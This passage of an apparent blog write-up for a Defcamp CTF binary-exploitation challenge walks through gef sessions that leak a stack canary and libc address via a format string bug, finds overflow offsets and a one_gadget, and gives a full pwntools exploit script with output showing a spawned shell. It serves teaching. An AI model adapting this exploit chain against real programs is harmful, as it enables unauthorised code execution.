─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x000055555555481e</span> <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
gef➤  p <span class="token operator">$</span>rcx
<span class="token operator">$</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x50a01b0663fa1e00</span>    <span class="token operator">&lt;-</span><span class="token operator">-</span> Ye<span class="token punctuation">,</span> there it is.
gef➤  </code></pre>
<p>Here, we have a stack canary leak which is equal to the one in <code>rcx</code> register where it’s getting stored. So, now we need to find out the libc offset as we are now on buffer overflow stage. As we already know we need to get libc offset and from earlier that format string vulnerability was causing the libc address to leak, so it’d be a matter of time to find it out:-</p>
<pre class=" language-r"><code class="language-r">gef➤  r
Starting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3 
Enter name <span class="token operator">:</span> %<span class="token number">3</span><span class="token operator">$</span>lx
Hello
7ffff7af4154
Enter sentence <span class="token operator">:</span> <span class="token operator">^</span>C  
Program received signal SIGINT<span class="token punctuation">,</span> Interrupt.

<span class="token operator">-</span><span class="token operator">-</span> snip <span class="token operator">-</span><span class="token operator">-</span>

gef➤  vmmap
Start              End                Offset             Perm Path
<span class="token number">0x0000555555554000</span> <span class="token number">0x0000555555555000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3
<span class="token number">0x0000555555754000</span> <span class="token number">0x0000555555755000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3
<span class="token number">0x0000555555755000</span> <span class="token number">0x0000555555756000</span> <span class="token number">0x0000000000001000</span> rw<span class="token operator">-</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3
<span class="token number">0x0000555555756000</span> <span class="token number">0x0000555555777000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
<span class="token number">0x00007ffff79e4000</span> <span class="token number">0x00007ffff7bcb000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7bcb000</span> <span class="token number">0x00007ffff7dcb000</span> <span class="token number">0x00000000001e7000</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7dcb000</span> <span class="token number">0x00007ffff7dcf000</span> <span class="token number">0x00000000001e7000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7dcf000</span> <span class="token number">0x00007ffff7dd1000</span> <span class="token number">0x00000000001eb000</span> rw<span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7dd1000</span> <span class="token number">0x00007ffff7dd5000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> 
<span class="token number">0x00007ffff7dd5000</span> <span class="token number">0x00007ffff7dfc000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7fd1000</span> <span class="token number">0x00007ffff7fd3000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> 
<span class="token number">0x00007ffff7ff7000</span> <span class="token number">0x00007ffff7ffa000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>
<span class="token number">0x00007ffff7ffa000</span> <span class="token number">0x00007ffff7ffc000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>
<span class="token number">0x00007ffff7ffc000</span> <span class="token number">0x00007ffff7ffd000</span> <span class="token number">0x0000000000027000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7ffd000</span> <span class="token number">0x00007ffff7ffe000</span> <span class="token number">0x0000000000028000</span> rw<span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span>.so
<span class="token number">0x00007ffff7ffe000</span> <span class="token number">0x00007ffff7fff000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> 
<span class="token number">0x00007ffffffde000</span> <span class="token number">0x00007ffffffff000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>
<span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span>
gef➤  p <span class="token number">0x7ffff7af4154</span> <span class="token operator">-</span> <span class="token number">0x00007ffff79e4000</span>
<span class="token operator">$</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x110154</span></code></pre>
<p>Using <code>vmmap</code> we get to know the address of executable and writable libc and using the address we leaked from <code>%3$lx</code> input we have the leaked libc address, we just subtracted the leak address from the <code>libc.so.6</code> address, we get the offset.</p>
<p>Time to find out the offsets for register so we we will create our final exploit:-</p>
<pre class=" language-r"><code class="language-r">gef➤  b <span class="token operator">*</span>main<span class="token operator">+</span><span class="token number">164</span>
Breakpoint <span class="token number">1</span> at <span class="token number">0x81e</span>
gef➤  pattern create <span class="token number">100</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Generating a pattern of <span class="token number">100</span> bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Saved as <span class="token string">'$_gef0'</span>
gef➤  r
Starting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3 
Enter name <span class="token operator">:</span> AAAA
Hello
AAAA
Enter sentence <span class="token operator">:</span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
<span class="token punctuation">[</span> Legend<span class="token operator">:</span> Modified register <span class="token operator">|</span> Code <span class="token operator">|</span> Heap <span class="token operator">|</span> Stack <span class="token operator">|</span> String <span class="token punctuation">]</span>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
<span class="token operator">$</span>rax   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>rbx   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>rcx   <span class="token operator">:</span> <span class="token number">0x6161616161616164</span> <span class="token punctuation">(</span><span class="token string">"daaaaaaa"</span>?<span class="token punctuation">)</span>
<span class="token operator">$</span>rdx   <span class="token operator">:</span> <span class="token number">0x00007ffff7dd18d0</span>  →  <span class="token number">0x0000000000000000</span>
<span class="token operator">$</span>rsp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd10</span>  →  <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp
<span class="token operator">$</span>rbp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd40</span>  →  <span class="token string">"eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"</span>
<span class="token operator">$</span>rsi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd20</span>  →  <span class="token string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>
<span class="token operator">$</span>rdi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd21</span>  →  <span class="token string">"aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"</span>
<span class="token operator">$</span>rip   <span class="token operator">:</span> <span class="token number">0x000055555555481e</span>  →  <span class="token number">0x000028250c334864</span> <span class="token punctuation">(</span>"dH3
                                                        %<span class="token punctuation">(</span>"?<span class="token punctuation">)</span>
<span class="token operator">$</span>r8    <span class="token operator">:</span> <span class="token number">0x00005555557566d5</span>  →  <span class="token number">0x0000000000000000</span>
<span class="token operator">$</span>r9    <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span>
<span class="token operator">$</span>r10   <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span>
<span class="token operator">$</span>r11   <span class="token operator">:</span> <span class="token number">0x246</span>             
<span class="token operator">$</span>r12   <span class="token operator">:</span> <span class="token number">0x0000555555554670</span>  →  <span class="token operator">&lt;</span>_start<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> xor ebp<span class="token punctuation">,</span> ebp
<span class="token operator">$</span>r13   <span class="token operator">:</span> <span class="token number">0x00007fffffffde20</span>  →  <span class="token number">0x0000000000000001</span>
<span class="token operator">$</span>r14   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>r15   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>eflags<span class="token operator">:</span> <span class="token punctuation">[</span>ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification<span class="token punctuation">]</span>
<span class="token operator">$</span>cs<span class="token operator">:</span> <span class="token number">0x0033</span> <span class="token operator">$</span>ss<span class="token operator">:</span> <span class="token number">0x002b</span> <span class="token operator">$</span>ds<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>es<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>fs<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>gs<span class="token operator">:</span> <span class="token number">0x0000</span> 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
<span class="token number">0x00007fffffffdd10</span>│<span class="token operator">+</span><span class="token number">0x0000</span><span class="token operator">:</span> <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp     ← <span class="token operator">$</span>rsp
<span class="token number">0x00007fffffffdd18</span>│<span class="token operator">+</span><span class="token number">0x0008</span><span class="token operator">:</span> <span class="token number">0x00007ffff7dcfa00</span>  →  <span class="token number">0x00000000fbad2288</span>
<span class="token number">0x00007fffffffdd20</span>│<span class="token operator">+</span><span class="token number">0x0010</span><span class="token operator">:</span> <span class="token string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>     ← <span class="token operator">$</span>rsi
<span class="token number">0x00007fffffffdd28</span>│<span class="token operator">+</span><span class="token number">0x0018</span><span class="token operator">:</span> <span class="token string">"baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha[...]"</span>
<span class="token number">0x00007fffffffdd30</span>│<span class="token operator">+</span><span class="token number">0x0020</span><span class="token operator">:</span> <span class="token string">"caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia[...]"</span>
<span class="token number">0x00007fffffffdd38</span>│<span class="token operator">+</span><span class="token number">0x0028</span><span class="token operator">:</span> <span class="token string">"daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"</span>
<span class="token number">0x00007fffffffdd40</span>│<span class="token operator">+</span><span class="token number">0x0030</span><span class="token operator">:</span> <span class="token string">"eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"</span>     ← <span class="token operator">$</span>rbp
<span class="token number">0x00007fffffffdd48</span>│<span class="token operator">+</span><span class="token number">0x0038</span><span class="token operator">:</span> <span class="token string">"faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"</span>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code<span class="token operator">:</span>x86<span class="token operator">:</span><span class="token number">64</span> ────
   <span class="token number">0x555555554810</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span>       call   <span class="token number">0x555555554650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x555555554815</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">155</span><span class="token operator">></span>       mov    eax<span class="token punctuation">,</span> <span class="token number">0x0</span>
   <span class="token number">0x55555555481a</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span>       mov    rcx<span class="token punctuation">,</span> QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span>
 → <span class="token number">0x55555555481e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">164</span><span class="token operator">></span>       xor    rcx<span class="token punctuation">,</span> QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>
   <span class="token number">0x555555554827</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">173</span><span class="token operator">></span>       je     <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>
   <span class="token number">0x555555554829</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">175</span><span class="token operator">></span>       call   <span class="token number">0x555555554630</span> <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>       leave  
   <span class="token number">0x55555555482f</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">181</span><span class="token operator">></span>       ret    
   <span class="token number">0x555555554830</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push   r15
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] Id 1, Name: "q3", stopped, reason: BREAKPOINT</span>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] 0x55555555481e → main()</span>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x000055555555481e</span> <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
gef➤  pattern search daaaaaaa
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Searching <span class="token string">'daaaaaaa'</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">17</span> <span class="token punctuation">(</span>little<span class="token operator">-</span>endian search<span class="token punctuation">)</span> likely
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">24</span> <span class="token punctuation">(</span>big<span class="token operator">-</span>endian search<span class="token punctuation">)</span> 
gef➤  pattern search eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Searching <span class="token string">'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka'</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">32</span> <span class="token punctuation">(</span>big<span class="token operator">-</span>endian search<span class="token punctuation">)</span> 
gef➤  p <span class="token operator">$</span>rcx
<span class="token operator">$</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x6161616161616164</span>   <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> Canary value overwrtten</code></pre>
<p>As you can see we have overwritten the canary and we have the <code>rcx</code> register offset and we have <code>rbp</code> register offset at 32 which would be <code>32 - 24 = 8</code>. </p>
<h3 id="One-gadget-The-best-tool-for-finding-one-gadget-RCE-in-libc-so-6"><a href="#One-gadget-The-best-tool-for-finding-one-gadget-RCE-in-libc-so-6" class="headerlink" title="One_gadget - The best tool for finding one gadget RCE in libc.so.6"></a>One_gadget - The best tool for finding one gadget RCE in libc.so.6</h3><p>I can honsetly vouch for this tool, this was the first time I used it and it’s just awesome. With this tool it was easier to find the gadgets for shell spwaning.</p>
<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> ldd q3
    linux<span class="token operator">-</span>vdso.so<span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff7ffa000</span><span class="token punctuation">)</span>
    libc.so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc.so<span class="token number">.6</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff77e2000</span><span class="token punctuation">)</span>
    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span>.so<span class="token number">.2</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff7dd5000</span><span class="token punctuation">)</span>
robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> one_gadget <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc.so<span class="token number">.6</span>
<span class="token number">0x4f2c5</span> execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token operator">:</span>
  rcx <span class="token operator">==</span> <span class="token keyword">NULL</span>

<span class="token number">0x4f322</span> execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token operator">:</span>
  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">NULL</span>

<span class="token number">0x10a38c</span> execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token operator">:</span>
  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">NULL</span></code></pre>
<p>I’ll be using the first one <code>0x4f2c5</code>. Now, it’s time to pwn:-</p>
<h3 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h3><p>We have almost everything, now it’s time for final exploit:-</p>
<p>Here’s the idea, I’ll be using the format string specifier to leak canary and libc address and then use the stack canary value to send the payload and using the libc address offset we will get the one_gadget address and we are done.</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true"># stack canary is at offset 11 for format string</span>
<span class="token comment" spellcheck="true"># It is at offset 24 for buffer overflow</span>

BINARY <span class="token operator">=</span> <span class="token string">'./q3'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>BINARY<span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./q3"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Leak stack canary (offset 11) and the libc address (offset 3)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%11$lx-%3$lx'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
leaks <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack_canary <span class="token operator">=</span> int<span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Stack Canary</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x110154</span>  <span class="token comment" spellcheck="true"># LIBC offset we found earlier </span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

one_gadget <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x4f2c5</span> <span class="token comment" spellcheck="true"># using one_gadget </span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'one_gadget: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># Write up to the stack canary</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stack_canary<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Ensure we don't change the stack canary</span>
payload <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token comment" spellcheck="true"># Overwrite RBP to reach upto RIP</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Overwrite RIP with pre-made shell</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>Running the exploit we will get shell:-</p>
<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> python q3_exp.py 
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/robin/CTFs/Defcamp/q3'</span>
    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
    RELRO<span class="token operator">:</span>    Full RELRO
    Stack<span class="token operator">:</span>    Canary found
    NX<span class="token operator">:</span>       NX enabled
    PIE<span class="token operator">:</span>      PIE enabled
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
    RELRO<span class="token operator">:</span>    Partial RELRO
    Stack<span class="token operator">:</span>    Canary found
    NX<span class="token operator">:</span>       NX enabled
    PIE<span class="token operator">:</span>      PIE enabled
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">9550</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> canary<span class="token operator">:</span> <span class="token number">0x648678ab45c48e00</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> libc base<span class="token operator">:</span> <span class="token number">0x7ffff79e4000</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> one_gadget<span class="token operator">:</span> <span class="token number">0x7ffff7a332c5</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
<span class="token operator">$</span> ls
core                 libc.so<span class="token number">.6</span>       q3_exp.py  q3.til
<span class="token operator">$</span> 
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Interrupted
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">9550</span><span class="token punctuation">)</span></code></pre>
<p>That was it folks, took more than I thought it would but we made it.</p>
<p>I hope you enjoyed it and learned something today. If you encountered any problem or anything relevant contact me on <a href="https://twitter.com/d4mianwayne" target="_blank" rel="noopener">twitter</a></p>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://justrying-code.github.io" rel="external nofollow noreferrer">d4mianwayne</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://justrying-code.github.io/2018/09/13/fmt-bof/">https://justrying-code.github.io/2018/09/13/fmt-bof/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="https://justrying-code.github.io" target="_blank">d4mianwayne</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/pwn-fmtstr-bof/">
                                    <span class="chip bg-color">pwn, fmtstr, bof</span>
                                </a>
                            
                        </div>
                    
                </div>
